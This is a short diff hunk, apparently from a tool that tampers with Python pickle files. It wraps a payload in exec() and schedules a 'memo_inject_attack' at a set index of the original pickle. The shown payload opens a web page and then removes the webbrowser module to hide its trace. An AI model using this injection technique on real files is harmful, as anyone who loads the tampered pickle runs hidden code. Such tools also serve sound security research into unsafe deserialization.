@@ -14,6 +14,7 @@ webbrowser.open("https://www.youtube.com/watch?v=gDjMZvYWUdo")
 import sys
 del sys.modules['webbrowser']
 '''
+payload = f"exec(\'\'\'{payload}\'\'\')"
 
 attacks = [AttackInjector.memo_inject_attack]
 attack_indices = [200] # Indicies in original pickle file before tampering (in order pls)
